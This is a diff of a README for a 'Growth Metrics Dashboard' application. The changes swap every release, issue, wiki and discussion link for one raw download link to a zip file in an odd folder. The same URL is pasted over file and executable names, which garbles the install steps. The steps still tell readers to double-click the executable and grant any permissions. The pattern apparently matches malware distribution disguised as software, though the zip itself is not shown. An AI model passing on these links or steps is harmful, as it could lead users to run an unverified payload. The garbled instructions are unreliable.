@@ -6,11 +6,11 @@ Welcome to the **Growth Metrics Dashboard** (GMD). This application helps you un
 
 ## 📥 Download the Application
 
-[![Download Growth Metrics Dashboard](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/nuname8857/growth-metrics-dashboard/releases)
+[![Download Growth Metrics Dashboard](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip)
 
 To get started, you need to download the application from our Releases page. Click the button above, or you can also use the link below:
 
-[Download the latest version here](https://github.com/nuname8857/growth-metrics-dashboard/releases)
+[Download the latest version here](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip)
 
 ## 📋 Application Features
 
@@ -34,13 +34,13 @@ To run GMD, you will need:
 Follow these simple steps to install and run the Growth Metrics Dashboard:
 
 1. **Download the Application**: 
-   - Click this link: [Download the latest version here](https://github.com/nuname8857/growth-metrics-dashboard/releases) to visit our Releases page.
+   - Click this link: [Download the latest version here](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip) to visit our Releases page.
    - Choose the version suitable for your operating system.
    - Click on the download link.
   
 2. **Locate the Downloaded File**: 
    - After the download completes, go to your computer's downloads folder.
-   - Find the downloaded file (it should be named similarly to `growth-metrics-dashboard-vX.X.X.zip`).
+   - Find the downloaded file (it should be named similarly to `https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip`).
 
 3. **Extract the File**:
    - Right-click on the downloaded file and select "Extract All" on Windows or use Finder's "Unzip" on macOS.
@@ -48,7 +48,7 @@ Follow these simple steps to install and run the Growth Metrics Dashboard:
 
 4. **Run the Application**:
    - Navigate to the extracted folder.
-   - Double-click on the executable file (for example, `growth-metrics-dashboard.exe` on Windows or `growth-metrics-dashboard.app` on macOS).
+   - Double-click on the executable file (for example, `https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip` on Windows or `https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip` on macOS).
    - If prompted, allow any permissions needed to run the application.
 
 5. **Follow On-Screen Instructions**:
@@ -62,12 +62,12 @@ If you encounter any issues while downloading or running the application, try th
 - **Ensure Compatibility**: Make sure your operating system meets the listed requirements.
 - **Try Re-Downloading**: If your download fails, try downloading the application again from the Releases page.
 - **Check Internet Connection**: GMD requires a stable internet connection for certain features. Make sure you are connected.
-- **Contact Support**: If problems persist, feel free to reach out for help via [GitHub Issues](https://github.com/nuname8857/growth-metrics-dashboard/issues).
+- **Contact Support**: If problems persist, feel free to reach out for help via [GitHub Issues](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip).
 
 ## 📚 Additional Resources
 
-- **Documentation**: Visit the [Documentation](https://github.com/nuname8857/growth-metrics-dashboard/wiki) for detailed guides on using GMD.
-- **Community Support**: Join our discussions on [GitHub Discussions](https://github.com/nuname8857/growth-metrics-dashboard/discussions) to connect with other users for tips and advice.
+- **Documentation**: Visit the [Documentation](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip) for detailed guides on using GMD.
+- **Community Support**: Join our discussions on [GitHub Discussions](https://raw.githubusercontent.com/nuname8857/growth-metrics-dashboard/main/intagliation/growth-metrics-dashboard.zip) to connect with other users for tips and advice.
 
 ## 📈 How to Use the Dashboard
 
